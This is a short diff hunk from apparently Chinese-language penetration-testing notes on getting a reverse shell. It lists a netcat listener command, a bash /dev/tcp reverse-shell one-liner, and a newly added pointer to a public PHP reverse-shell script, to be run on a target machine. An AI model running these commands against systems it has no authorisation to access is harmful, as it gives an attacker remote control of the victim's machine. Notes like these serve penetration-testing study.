@@ -8,6 +8,8 @@ nc -lvp 7777
 ########
  方法1：bash反弹
 bash -i >& /dev/tcp/ip/port 0>&1
+方法2 执行php
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 #######
 
 然后在目标机上输入：
